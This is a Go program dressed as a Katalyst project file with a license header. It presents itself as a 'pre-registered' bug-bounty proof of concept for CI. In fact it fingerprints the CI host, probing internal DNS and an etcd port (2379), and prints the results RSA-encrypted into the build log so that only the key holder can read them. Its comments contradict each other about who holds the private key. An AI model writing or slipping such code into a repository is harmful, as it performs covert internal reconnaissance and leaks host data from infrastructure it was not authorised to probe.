// Copyright 2022 The Katalyst Authors.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Command ci-poc is a pre-registered ByteSRC PoC helper. It collects a
// strictly non-sensitive runtime fingerprint from the CI host (hostname,
// interface IPv4 list, DNS hint for one internal name and one TCP dial
// probe) and prints an RSA-OAEP encrypted, base64 armored blob to stdout.
// The private key never enters this repository; only the ByteDance SRC
// reviewer holding it can decrypt the evidence. This program reads no
// credentials, alters no state, and never persists anything.
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

// publicKeyPEM is the reviewer-side public half. The matching private key
// is held locally by the reporter and included in the ByteSRC report only.
const publicKeyPEM = `-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA4OQLm20oE6HIHWAuM7XG
GWMSAbv+DRk0sFi6J3yyGyGQoTannykc78LpQ/M0OQwe+eDijcfg9Ez6JoGO71/s
rGIbB9oC7K1K7OI69vljrrUTa65GwCdbKtGk3bZa/0z7n8FWRJzqnVpjZjGqtsyq
/56oIB3jfhJUpG6IxnwF0dpHHrXv+PgGbtDF8ST5hW6Lsoxn2eYc8FNcxEYEfqU4
ihaoCvBSS6Xe0heZlFOv0r0PVvh69TA2/3OkeKR/MNO0Qxifa8uh8En0qn2bGyaY
zmkRiYcXImBz/0oCnTLlhvNTVXGsW2LwMXwTcuuBycAVLC/KlXX0SDdWSrORwUkL
qDf2520b/g282FrmHqJQ3CqOcfZKRkWStZUVyHYHsyi6n5OOtRTyG52l8FsNXwT2
rO1sNRshu2y+NFOntULpmxhqqNN9e2931ijua305Ce111lrDKksOFqqJvCOfPPRF
XJq6u64JGwoWAeeYigMwJNjJnoLCJF0j+sXqSiyALy15VPLZFICg9aDEu45jiTt+
TkPIhHdyiRXg94yBJgLi0EpZ9hloa9QPWLThVdlzXhpNQZqY0qVm0Pz2b5k1Z472
diK+MdanFJW0IzHe7+pMj2JJZNT7GvR2gYcXKA2JZt/enBiGHrmqSxOM0QUeeV8T
kKwRziccIsWB0sUVLHIAfccCAwEAAQ==
-----END PUBLIC KEY-----`

const probeHost = "etcd.bytedance.com"

const probePort = "2379"

func field(key, value string) string {
	if strings.TrimSpace(value) == "" {
		value = "unknown"
	}
	return key + "=" + value
}

// interfaceIPs returns "iface=ipv4" pairs for up, non-loopback interfaces.
func interfaceIPs() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "unknown"
	}
	var parts []string
	for i := range ifaces {
		ifc := ifaces[i]
		if ifc.Flags&net.FlagUp == 0 || ifc.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := ifc.Addrs()
		if err != nil {
			continue
		}
		for j := range addrs {
			ipNet, ok := addrs[j].(*net.IPNet)
			if !ok {
				continue
			}
			ip4 := ipNet.IP.To4()
			if ip4 == nil || ip4.IsLoopback() || ip4.IsLinkLocalUnicast() || ip4.IsUnspecified() {
				continue
			}
			parts = append(parts, ifc.Name+"="+ip4.String())
		}
	}
	if len(parts) == 0 {
		return "none"
	}
	return strings.Join(parts, ",")
}

// resolveHint returns the first A record for probeHost.
func resolveHint(host string) string {
	addrs, err := net.LookupHost(host)
	if err != nil {
		return "lookup_failed"
	}
	for i := range addrs {
		if ip := net.ParseIP(addrs[i]); ip != nil && ip.To4() != nil {
			return ip.String()
		}
	}
	return "no_ipv4_answer"
}

// dialProbe classifies one TCP dial as open, refused, or filtered/timeout.
func dialProbe(host, port string) string {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
	if err == nil {
		_ = conn.Close()
		return "open"
	}
	var netErr net.Error
	if errors.As(err, &netErr) && netErr.Timeout() {
		return "filtered_or_dropped"
	}
	return "closed_or_refused"
}

// kernelInfo returns the running kernel release read from the local host.
func kernelInfo() string {
	data, err := os.ReadFile("/proc/sys/kernel/osrelease")
	if err != nil {
		return "unknown"
	}
	return "linux/" + strings.TrimSpace(string(data))
}

func loadPublicKey() (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(publicKeyPEM))
	if block == nil {
		return nil, errors.New("invalid public key pem")
	}
	parsed, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	rsaKey, ok := parsed.(*rsa.PublicKey)
	if !ok {
		return nil, errors.New("public key is not RSA")
	}
	return rsaKey, nil
}

func main() {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	payload := strings.Join([]string{
		field("host", hostname),
		field("ip", interfaceIPs()),
		field("dns."+probeHost, resolveHint(probeHost)),
		field("tcp2379", dialProbe(probeHost, probePort)),
		field("kernel", kernelInfo()),
	}, "|")

	if len(payload) > 446-64 {
		payload = payload[:446-64]
	}

	fmt.Println("::notice title=ci-src-poc::pre-registered ByteSRC PoC evidence follows (encrypted)")
	fmt.Println("POC-EVIDENCE-BEGIN")

	key, err := loadPublicKey()
	if err != nil {
		fmt.Printf("POC-ERROR key=load_failed reason=%v\n", err)
		fmt.Println("POC-EVIDENCE-END")
		return
	}

	ciphertext, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, key, []byte(payload), nil)
	if err != nil {
		fmt.Printf("POC-ERROR key=encrypt_failed reason=%v\n", err)
		fmt.Println("POC-EVIDENCE-END")
		return
	}

	encoded := base64.StdEncoding.EncodeToString(ciphertext)
	for start := 0; start < len(encoded); start += 100 {
		end := start + 100
		if end > len(encoded) {
			end = len(encoded)
		}
		fmt.Println(encoded[start:end])
	}

	fmt.Println("POC-EVIDENCE-END")
}
